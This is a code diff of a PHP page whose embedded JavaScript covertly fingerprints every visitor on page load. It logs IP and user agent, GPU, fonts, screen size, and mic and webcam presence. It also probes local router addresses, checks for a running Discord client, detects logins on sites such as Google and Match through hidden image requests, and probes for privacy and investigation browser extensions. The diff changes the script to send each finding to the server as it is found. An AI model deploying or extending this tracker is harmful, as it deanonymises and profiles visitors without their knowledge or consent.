@@ -1,9 +1,32 @@
 <?php
 
 session_start();
-if (isset($_POST['d'])){ // If the browser is POSTING the gathered data to us
 
-    file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $_SERVER['REQUEST_URI'] . "\n" . $_POST['d'] . "\n", FILE_APPEND | LOCK_EX);
+
+if (isset($_POST['k']) && isset($_POST['v'])){ // If the browser is POSTING the gathered data to us
+   
+    // If it's the first time this user has had this IP address, or user agent.
+    if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips']) || !in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
+        if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips'])){
+            array_push($_SESSION['ips'], $_SERVER['REMOTE_ADDR']);
+        }
+        if (!in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
+            array_push($_SESSION['agents'], $_SERVER['HTTP_USER_AGENT']);
+        }
+        $fileContents = file_get_contents($_SESSION['fileName']);
+
+        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
+    }
+
+    // If this IP or User-Agent is different than the last one we got
+    if ($_SESSION['latestIP'] != $_SERVER['REMOTE_ADDR'] || $_SESSION['latestUA'] != $_SERVER['HTTP_USER_AGENT']){
+        $_SESSION['latestIP'] = $_SERVER['REMOTE_ADDR'];
+        $_SESSION['latestUA'] = $_SERVER['HTTP_USER_AGENT'];
+
+        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
+    } 
+
+    file_put_contents($_SESSION['fileName'], $_POST['k'] . ": " . $_POST['v'] . "\n", FILE_APPEND | LOCK_EX);
     return;
 }
 
@@ -19,19 +42,6 @@ if (!array_key_exists('firstSeen', $_SESSION)){
     $_SESSION['ips'] = array();
     $_SESSION['agents'] = array();
     file_put_contents($_SESSION['fileName'], "");
-}
-
-// If it's the first time this user has had this IP address, or user agent.
-if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips']) || !in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
-    if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips'])){
-        array_push($_SESSION['ips'], $_SERVER['REMOTE_ADDR']);
-    }
-    if (!in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
-        array_push($_SESSION['agents'], $_SERVER['HTTP_USER_AGENT']);
-    }
-    $fileContents = file_get_contents($_SESSION['fileName']);
-
-    file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n\n" . $fileContents);
 }
 
 // If we have a referer add it to their log file
@@ -81,15 +91,30 @@ var running = 0;
 var resp = {};
 let touch =  false;
 
+function submitResult(k, v) {
+    $.ajax({
+                type: 'POST',
+                url: window.location,
+                data: { 
+                    'k': k,
+                    'v': v 
+                },
+                success: function(msg){
+                }
+            });
+}
+
 window.onload = function(){
     // Check if touch is enabled
     try {  
         running++
         document.createEvent("TouchEvent");  
-        resp['touch'] = true;
-        //touch = true;
+        submitResult('touch', true);
+        //resp['touch'] = true;
+        
     } catch (e) {  
-        resp['touch'] = false;
+        submitResult('touch', false);
+        //resp['touch'] = false;
     }  
 
     // Try connectng to router IP addresses
@@ -101,19 +126,16 @@ window.onload = function(){
             dataType: "html",
             cache: "false",
             complete: function(one, two) {
-                    if (two == "success") {
+                    if (two == "success" || two == "error") {
                         if (route == "") {
                             route = ip;
-                            resp['router'] = ip;
-                        }
-                    } else if (two == "error") {
-                        if (route == "") {
-                            route = ip;
-                            resp['router'] = ip;
+                            //resp['router'] = ip;
+                            submitResult('router', ip);
+                            
                         }
                     } else {
                         if (route == "") {
-                        resp['router'] = false;
+                        //resp['router'] = false;
                         }
                     }
 
@@ -123,7 +145,7 @@ window.onload = function(){
     }
 
     running++
-    resp['router'] = "";
+    //resp['router'] = "";
     checkForRouter("https://192.168.0.1");
     checkForRouter("https://192.168.0.254");
     checkForRouter("https://10.0.0.1");
@@ -157,21 +179,28 @@ window.onload = function(){
     var canvas;
     canvas = document.getElementById("glcanvas");
     var gl = canvas.getContext("experimental-webgl");
-    resp['gpu'] = getUnmaskedInfo(gl).renderer;
+    //resp['gpu'] = getUnmaskedInfo(gl).renderer;
+    submitResult('gpu', getUnmaskedInfo(gl).renderer);
 
 
     // Get OS/browser info
 
     running += 4;
-    resp['browser'] = navigator.appCodeName;
-    resp['browserVersion'] = navigator.appVersion;
-    resp['renderer'] = navigator.product;
-    resp['platform'] = navigator.platform;
+    //resp['browser'] = navigator.appCodeName;
+    //resp['browserVersion'] = navigator.appVersion;
+    //resp['renderer'] = navigator.product;
+    //resp['platform'] = navigator.platform;
+    submitResult('browser', navigator.appCodeName);
+    submitResult('browserVersion', navigator.appVersion);
+    submitResult('renderer', navigator.product);
+    submitResult('platform', navigator.platform);
 
     // Get screen X/Y
     running += 2;
-    resp['ScreenX'] = screen.width;
-    resp['ScreenY'] = screen.height;
+    //resp['ScreenX'] = screen.width;
+    submitResult("Screen Width", screen.width);
+    //resp['ScreenY'] = screen.height;
+    submitResult('Screen Height', screen.height);
 
     running += 2;
     // Detect AV input
@@ -179,9 +208,11 @@ window.onload = function(){
         .then(function(devices) {
             devices.forEach(function(device) {
                 if (device.kind == "audioinput"){
-                    resp['mic'] = 'Found';
+                    //resp['mic'] = 'Found';
+                    submitResult('mic', 'Found');
                 } else if (device.kind == "videoinput"){
-                    resp['webcam'] = 'Found';
+                    //resp['webcam'] = 'Found';
+                    submitResult('webcam', 'Found');
                 }
             });
         })
@@ -189,11 +220,11 @@ window.onload = function(){
         });
         if ('mic' in resp) {
         } else {
-            resp['mic'] = "Not found";
+            //resp['mic'] = "Not found";
         }
         if ('webcam' in resp) {
         } else {
-            resp['webcam'] = "Not found";
+            //resp['webcam'] = "Not found";
         }
 
     running++
@@ -204,11 +235,17 @@ window.onload = function(){
         cache: "false",
         complete: function(one, two) {
             if (two == "success") {
-                resp['ipv6'] = one.responseText;
+                //resp['ipv6'] = one.responseText;
+                submitResult('ipv6', one.responseText);
 
-            } else {//if (two == "timeout") {
-                resp['ipv6'] = "Unable to retreive";
+            } else {
+                //resp['ipv6'] = "Unable to retrieve";
+                submitResult('ipv6', "Unable to retrieve");
             }
+        },
+        error: function(one, two, three) {
+            //resp['ipv6'] = "Unable to retrieve";
+            submitResult('ipv6', "Unable to retrieve");
         },
         timeout: 3000
     });
@@ -221,11 +258,20 @@ window.onload = function(){
         cache: "false",
         complete: function(one, two) {
             if (two == "success") {
-                resp['mtu'] = one.responseText;
+                //resp['mtu'] = one.responseText;
+                submitResult('mtu', one.responseText);
+
 
             } else {//if (two == "timeout") {
-                resp['mtu'] = "Unable to retreive";
+                //resp['mtu'] = "Unable to retrieve";
+                submitResult('mtu', "Unable to retrieve");
+
             }
+        },
+        error: function(one, two, three) {
+            //resp['mtu'] = "Unable to retrieve";
+            submitResult('mtu', "Unable to retrieve");
+
         },
         timeout: 3000
     });
@@ -238,9 +284,13 @@ window.onload = function(){
         cache: "false",
         error: function(one, two, three) {
             if (three === "Not Found") {
-                resp['discord'] = "Running";
+                //resp['discord'] = "Running";
+                submitResult('Discord', "Running");
+
             } else {
-                resp['discord'] = "Not running";
+                //resp['discord'] = "Not running";
+                submitResult('Discord', "Not Running");
+
 
             }
         },
@@ -268,12 +318,14 @@ window.onload = function(){
     }
 
     let browserFonts = [...fontAvailable.values()];
-    resp['fonts'] = browserFonts.length + " fonts: " + browserFonts;
+    //resp['fonts'] = browserFonts.length + " fonts: " + browserFonts;
+    submitResult('Fonts', browserFonts.length + " fonts: " + browserFonts);
+
 
 
     // Get logged in websites
     function checkLogin(website, url){
-        running++;
+        runningLogins++;
         var img = new Image();
         img.setAttribute("style","visibility:hidden");
         img.setAttribute("width","0");
@@ -281,17 +333,21 @@ window.onload = function(){
         img.src = url + "?&" + new Date().getTime();
         img.setAttribute("attr","start");
         img.onerror = function() {
-            running--;
+            runningLogins--;
         };
         img.onload = function() {
-            resp['logins'].push(website)
-            running--;
+            //resp['logins'].push(website)
+            foundLogins.push(website);
+            runningLogins--;
 
         };
 
         document.body.appendChild(img);
     }
 
+
+    foundLogins = [];
+    runningLogins = 0;
 
     logins = {}
     logins["Google Services"] = "https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico";
@@ -305,7 +361,7 @@ window.onload = function(){
     logins["Match"] = "https://www.match.com/login?to=/favicon.ico";
     
 
-    resp['logins'] = [];
+    //resp['logins'] = [];
     running++;
     for (var key in logins){
         if (logins.hasOwnProperty(key)){
@@ -313,23 +369,41 @@ window.onload = function(){
         }
     }
 
+    // Submit found logins once all websites are checked
+    function submitLogins(){
+        if (runningLogins > 0){
+            setTimeout(submitLogins, 500);
+        } else {
+            submitResult("Logins", foundLogins.toString())
+        }
+    }
+    submitLogins();
+
+
     
     // Get installed browser plugins (Chrome only)
     function checkExtension(name, url){
-        running++;
+        runningExt++;
         $.ajax({
         url: url,
         cache: "false",
         complete: function(one, two) {
             if (two == "success"){
-                resp['extensions'].push(name)
+                //resp['extensions'].push(name)
+                foundExt.push(name);
             }
-            running--;
+            runningExt--;
             
+        },
+        error: function(one, two, three) {
+            runningExt--;
         },
         timeout: 1000
     });
     }
+
+    foundExt = [];
+    runningExt = 0;
 
     extensions = {};
     extensions['Hunchly'] = 'chrome-extension://amfnegileeghgikpggcebehdepknalbf/content-script/modal.css';
@@ -340,7 +414,7 @@ window.onload = function(){
     extensions['User Agent Switcher'] = 'chrome-extension://kchfmpdcejfkipopnolndinkeoipnoia/jquery.js';
     extensions['Chrome Media Router'] = 'chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js';
 
-    resp['extensions'] = [];
+    //resp['extensions'] = [];
     running++;
     for (var key in extensions){
         if (extensions.hasOwnProperty(key)){
@@ -348,49 +422,60 @@ window.onload = function(){
         }
     }
 
+        // Submit found logins once all websites are checked
+    function submitExts(){
+        if (runningExt > 0){
+            setTimeout(submitExts, 500);
+        } else {
+            submitResult("Extensions", foundExt.toString());
+        }
+    }
+    submitExts();
+
     // Get system language
     running++
-    resp['language'] = navigator.language;
-
+    //resp['language'] = navigator.language;
+    submitResult("Language", navigator.language);
 
     // Get system time
     running++
     var today = new Date();
     var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
     var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
-    resp['System Time'] = date+' '+time;
+    //resp['System Time'] = date+' '+time;
+    submitResult("System Time", date+' '+time)
 
     // Wait for all results before POSTing to server
     // Or wait 5 seconds
     var sent = false;
 
-    function wait(){
-        if (Object.keys(resp).length < running) {
-            setTimeout(wait, 500);
-        } else {
-            var d = "";
-            for (var key in resp){
-                if (resp.hasOwnProperty(key)) {
-                    d = d + key + ": " + resp[key] + "\n";
-                }
-            }
+    // function wait(){
+    //     if (Object.keys(resp).length < running) {
+    //         setTimeout(wait, 500);
+    //     } else {
+    //         var d = "";
+    //         for (var key in resp){
+    //             if (resp.hasOwnProperty(key)) {
+    //                 d = d + key + ": " + resp[key] + "\n";
+    //             }
+    //         }
 
                 
-            // Send POST to server
-            $.ajax({
-                type: 'POST',
-                url: window.location,
-                data: { 
-                    'd': d 
-                },
-                success: function(msg){
-                }
-            });
-            sent = true;
+    //         // Send POST to server
+    //         $.ajax({
+    //             type: 'POST',
+    //             url: window.location,
+    //             data: { 
+    //                 'd': d 
+    //             },
+    //             success: function(msg){
+    //             }
+    //         });
+    //         sent = true;
 
-        }
-    }
-    wait()    
+    //     }
+    // }
+    // wait()    
 }
 
 </script>
